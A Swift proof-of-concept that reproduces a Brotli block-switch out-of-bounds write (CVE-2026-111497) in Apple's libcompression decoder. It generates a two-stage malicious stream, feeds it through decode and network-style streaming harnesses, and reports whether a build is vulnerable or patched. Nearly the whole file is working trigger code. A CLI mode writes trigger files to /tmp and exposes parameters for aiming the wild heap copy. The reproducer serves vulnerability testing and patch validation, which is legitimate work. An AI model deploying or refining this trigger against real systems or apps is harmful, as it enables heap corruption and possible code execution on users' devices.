// brotlirepro.swift — CVE-2026-111497 (Brotli BlockSwitch OOB write) reproducer.
//
// Swift port of the PoC's gen_trigger.c + decode_harness.c, wired to Apple's
// libcompression Brotli decoder through the *public* streaming API
// (compression_stream_init with COMPRESSION_BROTLI = 0xB02, iOS 15+).
//
// Parameters recovered from the published sample trigger:
//   wbits=13 body=0 d15=d19=d23=0x7fffffff b7=8  (stage1 23,068,693 B, stage2 127 B)
//
// Two stages must be fed as separate decoder inputs into ONE decoder instance:
// stage 1 is consumed fully (decoder parks for more input), then stage 2 drives
// the corrupted block-switch path. Concatenating them does not trigger.
//
// Self-contained: no files, no network. Builds the 23 MB stage 1 in memory.

import Foundation
import Compression

enum BrotliRepro {

    // MARK: - bit writer (mirrors gen_trigger.c)

    struct BitWriter {
        var out: [UInt8]
        var value: UInt32 = 0
        var used: Int = 0

        init(capacity: Int = 0) {
            out = []
            if capacity > 0 { out.reserveCapacity(capacity) }
        }

        mutating func put(_ v: UInt32, _ n: Int) {
            var i = 0
            while i < n {
                value |= ((v >> UInt32(i)) & 1) << UInt32(used)
                used += 1
                if used == 8 {
                    out.append(UInt8(truncatingIfNeeded: value))
                    value = 0
                    used = 0
                }
                i += 1
            }
        }

        mutating func flush() {
            if used != 0 {
                out.append(UInt8(truncatingIfNeeded: value))
                value = 0
                used = 0
            }
        }
    }

    static func bitlen(_ n: UInt32) -> Int {
        var c = 0
        var x = n
        while x != 0 { c += 1; x >>= 1 }
        return c
    }

    static func ost(_ b: inout BitWriter, _ alphabet: UInt32, _ symbol: UInt32) {
        b.put(1, 2)
        b.put(0, 2)
        b.put(symbol, bitlen(alphabet - 1))
    }

    static func vu8(_ b: inout BitWriter, _ v: UInt32) {
        if v == 0 { b.put(0, 1); return }
        b.put(1, 1)
        if v == 1 { b.put(0, 3); return }
        let w = UInt32(bitlen(v) - 1)
        b.put(w, 3)
        b.put(v - (1 << w), Int(w))
    }

    static func writeHeader(_ b: inout BitWriter, wbits: Int) {
        switch wbits {
        case 16:
            b.put(0, 1)
        case 18...24:
            b.put(1, 1); b.put(UInt32(wbits - 17), 3)
        case 10...15:
            b.put(1, 1); b.put(0, 3); b.put(UInt32(wbits - 8), 3)
        case 17:
            b.put(1, 1); b.put(0, 3); b.put(0, 3)
        default:
            fatalError("bad wbits")
        }
        b.put(0, 1)
        b.put(2, 2)
        b.put(0xFFFFFF, 24)
        b.put(0, 1)
        vu8(&b, 0)
        vu8(&b, 1)
        ost(&b, 4, 0)
        ost(&b, 26, 25)
        b.put(0xFFFFFF, 24)
        vu8(&b, 0)
        b.put(3, 6)
        b.put(0, 2)
        vu8(&b, 0)
        vu8(&b, 0)
        ost(&b, 256, 0)
        ost(&b, 704, 130)
        ost(&b, 704, 130)
        ost(&b, 400, 184)
    }

    /// Stage 1: a long valid-looking stream that parks the decoder mid-metablock.
    static func stage1(wbits: Int = 13, body: UInt32 = 0, cmdcountLog2: Int = 24) -> [UInt8] {
        var b = BitWriter(capacity: 23_100_000)
        writeHeader(&b, wbits: wbits)

        let total = UInt64(1) << UInt64(cmdcountLog2)
        var completed: UInt64 = 0
        while b.used != 0 && completed < total {
            b.put(body, 11)
            completed += 1
        }

        var group = BitWriter(capacity: 16)
        for _ in 0..<8 { group.put(body, 11) }
        group.flush()
        let gbytes = group.out

        let groups = (total - completed) / 8
        let tail = Int((total - completed) % 8)

        b.out.reserveCapacity(b.out.count + Int(groups) * gbytes.count + 64)
        var i: UInt64 = 0
        while i < groups {
            b.out.append(contentsOf: gbytes)
            i += 1
        }
        for _ in 0..<tail { b.put(body, 11) }
        b.flush()
        b.out.append(contentsOf: [0, 0, 0])
        return b.out
    }

    /// Stage 2: 127 bytes carrying the block-switch values.
    static func stage2(d15: UInt32 = 0x7fffffff,
                       d19: UInt32 = 0x7fffffff,
                       d23: UInt32 = 0x7fffffff,
                       b7: UInt8 = 8) -> [UInt8] {
        var s = [UInt8](repeating: 0, count: 127)
        s[7] = b7
        func store(_ off: Int, _ v: UInt32) {
            s[off + 0] = UInt8(truncatingIfNeeded: v)
            s[off + 1] = UInt8(truncatingIfNeeded: v >> 8)
            s[off + 2] = UInt8(truncatingIfNeeded: v >> 16)
            s[off + 3] = UInt8(truncatingIfNeeded: v >> 24)
        }
        store(15, d15)
        store(19, d19)
        store(23, d23)
        return s
    }

    // MARK: - continuous-stream harness (what an HTTP decoder sees)

    /// Feed stage1‖stage2 as one continuous byte stream, in `chunkSize` reads,
    /// exactly like a network decoder.  Two variants: `newInputPerChunk=false`
    /// keeps one src buffer alive and only advances the pointer; `true` hands a
    /// brand-new buffer to every process() call, as CFNetwork's ticketed source
    /// does.  Returns produced bytes.
    @discardableResult
    static func runStream(chunkSize: Int, newInputPerChunk: Bool, log: (String) -> Void) -> Int {
        let all = stage1() + stage2()
        log("[brs] stream=\(all.count) B chunk=\(chunkSize) newbuf=\(newInputPerChunk)")
        let outSize = 65536
        let dst = UnsafeMutablePointer<UInt8>.allocate(capacity: outSize)
        let scratch = UnsafeMutablePointer<UInt8>.allocate(capacity: 1)
        scratch.initialize(repeating: 0, count: 1)
        var stream = compression_stream(dst_ptr: dst, dst_size: 0,
                                        src_ptr: UnsafePointer(scratch), src_size: 0, state: nil)
        let ist = compression_stream_init(&stream, COMPRESSION_STREAM_DECODE, COMPRESSION_BROTLI)
        guard ist == COMPRESSION_STATUS_OK else { log("[brs] init FAILED"); return -1 }
        defer { dst.deallocate(); scratch.deallocate(); compression_stream_destroy(&stream) }

        var produced = 0
        var off = 0
        var calls = 0
        while off < all.count {
            let csize = min(chunkSize, all.count - off)
            let chunk = UnsafeMutablePointer<UInt8>.allocate(capacity: csize)
            all.withUnsafeBufferPointer { b in
                if let base = b.baseAddress { chunk.update(from: base + off, count: csize) }
            }
            defer { chunk.deallocate() }
            var base = UnsafePointer(chunk)
            var remain = csize
            while remain > 0 {
                stream.src_ptr = base; stream.src_size = remain
                stream.dst_ptr = dst; stream.dst_size = outSize
                let r = compression_stream_process(&stream, 0)
                calls += 1
                let c = remain - stream.src_size
                produced += outSize - stream.dst_size
                if newInputPerChunk {
                    // hand the next call a fresh pointer to the same bytes we just read
                    let next = UnsafeMutablePointer<UInt8>.allocate(capacity: max(1, remain))
                    next.update(from: base + c, count: remain)
                    // (leaks a few buffers; fine for a CLI)
                    base = UnsafePointer(next)
                } else {
                    base = base + c
                }
                remain = stream.src_size
                if r != COMPRESSION_STATUS_OK {
                    log("[brs] status=\(r.rawValue) off=\(off) produced=\(produced)")
                    return produced
                }
                if consumedStall(c) { return produced }
            }
            off += csize
            if calls > 200000 { break }
        }
        log("[brs] end produced=\(produced) calls=\(calls)")
        return produced
    }

    private static func consumedStall(_ c: Int) -> Bool { c == 0 }

    // MARK: - decode harness (mirrors decode_harness.c, via libcompression)

    @discardableResult
    static func run(chunkSize: Int = 65536, log: (String) -> Void) -> Int32 {
        let d1 = stage1()
        let d2 = stage2()
        log("[br] stage1=\(d1.count) B stage2=\(d2.count) B chunk=\(chunkSize)")

        let scratch = UnsafeMutablePointer<UInt8>.allocate(capacity: 1)
        scratch.initialize(repeating: 0, count: 1)
        var stream = compression_stream(dst_ptr: scratch, dst_size: 0,
                                        src_ptr: UnsafePointer(scratch), src_size: 0,
                                        state: nil)
        let ist = compression_stream_init(&stream, COMPRESSION_STREAM_DECODE, COMPRESSION_BROTLI)
        guard ist == COMPRESSION_STATUS_OK else {
            log("[br] stream_init FAILED status=\(ist.rawValue) (COMPRESSION_BROTLI unsupported?)")
            return -1
        }
        log("[br] stream_init OK, COMPRESSION_BROTLI=0x\(String(COMPRESSION_BROTLI.rawValue, radix: 16))")

        let src = UnsafeMutablePointer<UInt8>.allocate(capacity: d1.count)
        src.initialize(repeating: 0, count: d1.count)
        d1.withUnsafeBufferPointer { buf in
            if let base = buf.baseAddress { src.update(from: base, count: buf.count) }
        }
        let outSize = 65536
        let dst = UnsafeMutablePointer<UInt8>.allocate(capacity: outSize)
        defer {
            src.deallocate()
            dst.deallocate()
            compression_stream_destroy(&stream)
            scratch.deallocate()
        }

        // ---- stage 1: feed in chunks, draining output like a real consumer
        let n1 = d1.count
        var off = 0
        var stage1Done = false
        var producedTotal = 0
        var calls = 0
        while off < n1 {
            let csize = min(chunkSize, n1 - off)
            var base = UnsafePointer(src) + off
            var remain = csize
            var stalled = false
            while remain > 0 {
                stream.src_ptr = base
                stream.src_size = remain
                stream.dst_ptr = dst
                stream.dst_size = outSize

                let r = compression_stream_process(&stream, 0)
                calls += 1
                let consumed = remain - stream.src_size
                producedTotal += outSize - stream.dst_size
                base = base + consumed
                remain = stream.src_size

                if r == COMPRESSION_STATUS_ERROR {
                    log("[br] stage1 ERROR off=\(off + csize - remain) consumed=\(consumed) produced=\(producedTotal)")
                    return 1
                }
                if r == COMPRESSION_STATUS_END {
                    log("[br] stage1 END off=\(off + csize - remain) produced=\(producedTotal)")
                    stage1Done = true
                    break
                }
                if consumed == 0 && stream.dst_size != 0 { stalled = true; break }
            }
            if stage1Done { break }
            if stalled {
                log("[br] stage1 STALL off=\(off) produced=\(producedTotal)")
                break
            }
            off += csize
        }
        log("[br] stage1 fed off=\(off)/\(n1) calls=\(calls) produced=\(producedTotal)")

        // ---- stage 2: same decoder instance, separate input => the bug
        //
        // A well-formed 127-byte second stage can only yield a few bytes of
        // output. If the BlockSwitch corruption took effect, the decoder
        // instead believes it has a huge pending copy and keeps emitting
        // output forever (observed: 268 MB and counting). That runaway output
        // is the portable, non-ASAN signature that the corrupted state was
        // reached -- and the memmove16 that causes it writes at
        // ringbuffer+pos, i.e. out of bounds but inside the mapped heap.
        let drainCap = 256          // 256 * 64 KiB = 16 MiB ceiling
        var produced2 = 0
        var consumed2 = 0
        var status2 = COMPRESSION_STATUS_OK
        var calls2 = 0
        d2.withUnsafeBufferPointer { buf in
            var base = buf.baseAddress!
            var remain = buf.count
            while true {
                stream.src_ptr = base
                stream.src_size = remain
                stream.dst_ptr = dst
                stream.dst_size = outSize
                status2 = compression_stream_process(&stream, 0)
                let c = remain - stream.src_size
                let p = outSize - stream.dst_size
                consumed2 += c
                produced2 += p
                base = base + c
                remain = stream.src_size
                calls2 += 1
                if status2 != COMPRESSION_STATUS_OK { break }
                if c == 0 && p == 0 { break }
                if calls2 >= drainCap { break }
            }
        }
        log("[br] stage2: status=\(status2.rawValue) consumed=\(consumed2)/\(d2.count) produced=\(produced2) calls=\(calls2)")

        // Verdict. 127 input bytes -> >1 MiB output is impossible for a valid
        // stream; it means the block-switch corruption was applied.
        if produced2 > 1 << 20 {
            log("[br] VERDICT: CORRUPTED STATE REACHED (runaway output \(produced2) B from \(d2.count) B input)")
            log("[br] => libcompression Brotli is VULNERABLE to CVE-2026-111497 on this build")
            return 0
        }
        if status2 == COMPRESSION_STATUS_ERROR {
            log("[br] VERDICT: decoder rejected the block switch (error) => build looks PATCHED")
            return 2
        }
        log("[br] VERDICT: no corruption observed (produced=\(produced2) B)")
        return 3
    }
}

// MARK: - CLI entry (macOS validation harness)

#if BROTLI_CLI
let args = CommandLine.arguments
func emit(_ s: String) { FileHandle.standardOutput.write((s + "\n").data(using: .utf8)!) }

if args.contains("--dump") {
    // parameter overrides so we can sweep the aim of the wild copy:
    //   --cmdcount=<log2>  size of stage 1 (2^n commands)
    //   --b7=<n>           block-switch bits that corrupt the output position
    //   --d15/--d19/--d23   distance codes (the copy length / source)
    var cmdLog2 = 24
    var wbitsV = 13
    var b7v: UInt8 = 8
    var d15v: UInt32 = 0x7fffffff
    var d19v: UInt32 = 0x7fffffff
    var d23v: UInt32 = 0x7fffffff
    for a in CommandLine.arguments {
        func val(_ k: String) -> String? {
            guard a.hasPrefix(k + "=") else { return nil }
            return String(a.dropFirst(k.count + 1))
        }
        if let v = val("--cmdcount") { cmdLog2 = Int(v) ?? 24 }
        if let v = val("--wbits") { wbitsV = Int(v) ?? 13 }
        if let v = val("--b7") { b7v = UInt8(UInt32(v) ?? 8) }
        if let v = val("--d15") { d15v = UInt32(v, radix: 16) ?? 0x7fffffff }
        if let v = val("--d19") { d19v = UInt32(v, radix: 16) ?? 0x7fffffff }
        if let v = val("--d23") { d23v = UInt32(v, radix: 16) ?? 0x7fffffff }
    }
    let d1 = BrotliRepro.stage1(wbits: wbitsV, cmdcountLog2: cmdLog2)
    let d2 = BrotliRepro.stage2(d15: d15v, d19: d19v, d23: d23v, b7: b7v)
    try? Data(d1 + d2).write(to: URL(fileURLWithPath: "/tmp/trigger"))
    try? Data(d1).write(to: URL(fileURLWithPath: "/tmp/stage1.bin"))
    try? Data(d2).write(to: URL(fileURLWithPath: "/tmp/stage2.bin"))
    let hex = d1.prefix(32).map { String(format: "%02x", $0) }.joined()
    emit("stage1=\(d1.count) stage2=\(d2.count) first32=\(hex)")
    exit(0)
}

if args.contains("--stream") {
    var chunkSize = 65536
    var newbuf = false
    for a in args {
        if a.hasPrefix("--chunk=") { chunkSize = Int(a.dropFirst(8)) ?? 65536 }
        if a == "--newbuf" { newbuf = true }
    }
    let p = BrotliRepro.runStream(chunkSize: chunkSize, newInputPerChunk: newbuf) { emit($0) }
    emit(p > 1 << 20 ? "VERDICT CORRUPTED stream" : "VERDICT CLEAN stream")
    exit(p > 1 << 20 ? 0 : 3)
}
let chunk = args.count > 1 ? (Int(args[1]) ?? 65536) : 65536
let rc = BrotliRepro.run(chunkSize: chunk) { emit($0) }
exit(rc)
#endif
